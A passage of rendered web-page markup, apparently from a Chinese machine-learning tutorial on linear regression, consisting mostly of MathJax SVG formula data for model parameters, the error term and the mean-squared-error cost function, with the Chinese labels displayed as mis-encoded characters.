238Q83 239 95 253T121 283T142 304Q165 318 187 318T253 300T320 282Q335 282 348 288T368 299T388 318L402 306L416 295Q375 236 344 222Q330 215 313 215Q292 215 248 233T179 251Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1405.6,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow data-mjx-texclass="ORD"><msub><mi>Î¸</mi><mn>1</mn></msub></mrow><mtext>~</mtext><mrow data-mjx-texclass="ORD"><msub><mi>Î¸</mi><mi>n</mi></msub></mrow></math></mjx-assistive-mml></mjx-container>ï¼šè¾“å…¥ç‰¹å¾</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.919ex" height="1ex" role="img" focusable="false" viewbox="0 -431 406 442" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>Ïµ</mi></math></mjx-assistive-mml></mjx-container>ï¼šè¯¯å·®é¡¹ï¼ˆæœä»æ­£æ€åˆ†å¸ƒï¼‰</li></ul><h3 id="æ¨¡å‹è®­ç»ƒ">æ¨¡å‹è®­ç»ƒ</h3><p>ç›®æ ‡ï¼šæ‰¾åˆ°æœ€ä¼˜å‚æ•°<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.061ex" height="1.618ex" role="img" focusable="false" viewbox="0 -705 469 715" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>Î¸</mi></math></mjx-assistive-mml></mjx-container>ä½¿å¾—é¢„æµ‹è¯¯å·®æœ€å°åŒ–ã€‚</p><p><strong>æŸå¤±å‡½æ•°</strong>ï¼šå‡æ–¹è¯¯å·®ï¼ˆMSEï¼‰</p><p><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.798ex;" xmlns="http://www.w3.org/2000/svg" width="31.907ex" height="2.819ex" role="img" focusable="false" viewbox="0 -893.3 14103 1246.1" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(633,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1022,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1491,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2157.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(3213.6,0)"><g data-mml-node="mn" transform="translate(530.4,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mrow" transform="translate(220,-345) scale(0.707)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><rect width="1174.4" height="60" x="120" y="220"/></g><g data-mml-node="munderover" transform="translate(4794.6,0)"><g data-mml-node="mo"><path data-c="2211" d="M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1089,477.1) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><g data-mml-node="TeXAtom" transform="translate(1089,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(7081.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(7470.2,0)"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(609,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(8460.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(8849.9,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(10299,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(10910.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(11910.4,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(523,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msup" transform="translate(13277.5,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(422,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>J</mi><mo stretchy="false">(</mo><mi>Î¸</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>m</mi></mrow></mfrac><munderover><mo data-mjx-texclass="OP">âˆ‘</mo><mrow data-mjx-texclass="ORD"><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow data-mjx-texclass="ORD"><mi>m</mi></mrow></munderover><mo stretchy="false">(</mo><msub><mi>h</mi><mrow data-mjx-texclass="ORD"><mi>Î¸</mi></mrow></msub><mo stretchy="false">(</mo><msup><mi>x</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo><mo>âˆ’</mo><msup><mi>y</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><msup><mo stretchy="false">)</mo><mn>2</mn></msup></math></mjx-assistive-mml></mjx-container></p><ul><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 878 453" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>m</mi></math></mjx-assistive-mml></mjx-container>ï¼šæ ·æœ¬æ•°é‡ã€‚</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.296ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2340.6 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(609,-150) scale(0.707)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(990.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1379.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1951.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>h</mi><mi>Î¸</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>ï¼šæ¨¡å‹é¢„æµ‹å€¼ã€‚</li></ul><h2 id="æŸå¤±å‡½æ•°-Cost-Function">æŸå¤±å‡½æ•°(Cost 